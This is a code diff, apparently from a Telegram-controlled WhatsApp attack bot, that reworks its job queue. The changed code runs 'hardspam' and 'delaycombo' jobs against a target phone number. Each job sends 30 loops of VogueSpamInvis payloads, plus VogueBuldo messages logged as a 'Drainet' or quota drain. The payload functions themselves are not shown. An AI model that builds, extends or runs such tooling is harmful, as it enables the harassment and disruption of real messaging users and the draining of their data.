@@ -4404,11 +4404,15 @@ Example:
     let target =
         clean +
         "@s.whatsapp.net";
+        
+    const jobId =
+        Date.now() +
+        Math.floor(Math.random() * 9999);
 
     try {
 
         addQueue({
-            id: Date.now(),
+            id: jobId,
             target,
             number: clean,
             type: "delaycombo",
@@ -4416,10 +4420,12 @@ Example:
         });
 
         const queuePos =
-            spamQueue.length;
+            spamQueue.findIndex(
+                x => x.id === jobId
+            ) + 1;
 
         const TASK_DURATION =
-            (30 * 3000) +
+            (30 * 4000) +
             (3 * 60 * 1000);
 
         const estimatedMs =
@@ -4515,21 +4521,28 @@ Example:
         let target =
             clean +
             "@s.whatsapp.net";
+            
+        const jobId =
+            Date.now() +
+            Math.floor(Math.random() * 9999);
 
         try {
 
             addQueue({
-                id: Date.now(),
+                id: jobId,
+                type: "hardspam",
                 target,
                 number: clean,
                 createdAt: Date.now()
             });
             
             const queuePos =
-                spamQueue.length;
+                spamQueue.findIndex(
+                    x => x.id === jobId
+                ) + 1;
             
             const TASK_DURATION =
-                (30 * 3000) +
+                (30 * 4000) +
                 (3 * 60 * 1000);
             
             const estimatedMs =
@@ -4976,56 +4989,126 @@ async function processSpamQueue() {
     
     while (spamQueue.length > 0) {
         
-        const job = spamQueue[0];
+        const job =
+            spamQueue[0];
         
         const {
+            id,
+            type,
             target,
             number
         } = job;
-        
-        const queueNumber =
-            job.id;
         
         const instanceId =
             Date.now() + Math.random();
         
         console.log(
-            `[QUEUE ID ${queueNumber}] Starting ${number}`
+            `[QUEUE ${id}] Starting ${type} -> ${number}`
         );
         
         try {
             
-            for (let i = 0; i < 30; i++) {
+            // ========================================
+            // HARDSPAM
+            // ========================================
+            
+            if (
+                type === "hardspam"
+            ) {
+                
+                for (let i = 0; i < 30; i++) {
+                    
+                    try {
+                        
+                        await VogueSpamInvis(
+                            sock,
+                            target
+                        );
+                        
+                        console.log(
+                            `[HARDSPAM ${id}] Loop ${i + 1}/30`
+                        );
+                        
+                        await sleep(
+                            3000
+                        );
+                        
+                    } catch (e) {
+                        
+                        console.log(
+                            `[HARDSPAM ${id}] ${e.message}`
+                        );
+                        
+                        await restartBot(
+                            "Connection Closed"
+                        );
+                        
+                        break;
+                    }
+                }
+            }
+            
+            // ========================================
+            // DELAYCOMBO
+            // ========================================
+            
+            else if (
+                type === "delaycombo"
+            ) {
                 
                 try {
                     
-                    await VogueSpamInvis(
+                    await VogueBuldo(
                         sock,
                         target
                     );
                     
                     console.log(
-                        `[QUEUE #${queueNumber}] [WORKER ${instanceId}] Loop ${i + 1}/30`
+                        `[DELAYCOMBO ${id}] Drainet sent`
                     );
-                    
-                    await sleep(3000);
                     
                 } catch (e) {
                     
                     console.log(
-                        `[QUEUE #${queueNumber}] [WORKER ${instanceId}] ${e.message}`
+                        `[DELAYCOMBO ${id}] Drainet Error ${e.message}`
                     );
+                }
+                
+                for (let i = 0; i < 30; i++) {
                     
-                    await restartBot(
-                        "Connection Closed"
-                    );
-                    
-                    break;
+                    try {
+                        
+                        await VogueSpamInvis(
+                            sock,
+                            target
+                        );
+                        
+                        console.log(
+                            `[DELAYCOMBO ${id}] Loop ${i + 1}/30`
+                        );
+                        
+                        await sleep(
+                            3000
+                        );
+                        
+                    } catch (e) {
+                        
+                        console.log(
+                            `[DELAYCOMBO ${id}] ${e.message}`
+                        );
+                        
+                        await restartBot(
+                            "Connection Closed"
+                        );
+                        
+                        break;
+                    }
                 }
             }
+           
             
             console.log(
-                `[QUEUE #${queueNumber}] Finished ${number}`
+                `[QUEUE ${id}] Finished ${number}`
             );
             
             try {
@@ -5035,8 +5118,9 @@ async function processSpamQueue() {
                     `\`\`\`ruby
 QUEUE COMPLETED
 
-Queue ID : #${queueNumber}
-Loop     : 30
+Queue ID : #${id}
+Type     : ${type}
+Target   : ${number}
 Status   : Finished
 Engine   : Vogue Queue System
 \`\`\``,
@@ -5054,7 +5138,13 @@ Engine   : Vogue Queue System
             
             removeFirstQueue();
             
-            if (spamQueue.length > 0) {
+            // ========================================
+            // DELAY NEXT TASK
+            // ========================================
+            
+            if (
+                spamQueue.length > 0
+            ) {
                 
                 console.log(
                     `[QUEUE] Waiting 3 minutes before next task`
@@ -5075,128 +5165,6 @@ Engine   : Vogue Queue System
         }
     }
     
-    queueRunning = false;
-}
-
-async function processDelayComboQueue() {
-    if (queueRunning) return;
-    queueRunning = true;
-    while (spamQueue.length > 0) {
-        const job =
-            spamQueue[0];
-        const {
-            target,
-            number,
-            type
-        } = job;
-
-        if (
-            type !== "delaycombo"
-        ) {
-
-            break;
-        }
-
-        const queueNumber =
-            job.id;
-
-        const instanceId =
-            Date.now() + Math.random();
-
-        console.log(
-            `[DELAYCOMBO ${queueNumber}] Starting ${number}`
-        );
-
-        try {
-            
-            await VogueBuldo(sock, target)
-            console.log(`[DELAYCOMBO #${queueNumber}] QUOTA USAGE SENT!!`)
-
-            for (let i = 0; i < 30; i++) {
-
-                try {
-
-                    await VogueSpamInvis(
-                        sock,
-                        target
-                    );
-
-                    await VogueBuldo(
-                        sock,
-                        target
-                    );
-
-                    console.log(
-                        `[DELAYCOMBO #${queueNumber}] [WORKER ${instanceId}] Loop ${i + 1}/30`
-                    );
-
-                    await sleep(3000);
-
-                } catch (e) {
-
-                    console.log(
-                        `[DELAYCOMBO #${queueNumber}] [WORKER ${instanceId}] ${e.message}`
-                    );
-
-                    await restartBot(
-                        "Connection Closed"
-                    );
-
-                    break;
-                }
-            }
-
-            console.log(
-                `[DELAYCOMBO #${queueNumber}] Finished ${number}`
-            );
-
-            try {
-
-                await bot.telegram.sendMessage(
-                    LOG_QUEUE_CHANNEL_ID,
-`\`\`\`ruby
-DELAYCOMBO COMPLETED
-
-Queue ID : #${queueNumber}
-Loop     : 30
-Status   : Finished
-Engine   : Vogue Combo System
-\`\`\``,
-{
-    parse_mode: "Markdown"
-}
-                );
-
-            } catch (e) {
-
-                console.log(
-                    `[LOG ERROR] ${e.message}`
-                );
-            }
-
-            removeFirstQueue();
-
-            if (spamQueue.length > 0) {
-
-                console.log(
-                    `[DELAYCOMBO] Waiting 3 minutes before next task`
-                );
-
-                await sleep(
-                    3 * 60 * 1000
-                );
-            }
-
-        } catch (err) {
-
-            console.log(
-                `[DELAYCOMBO ERROR] ${err.message}`
-            );
-
-            removeFirstQueue();
-        }
-    }
-
     queueRunning = false;
 }
 
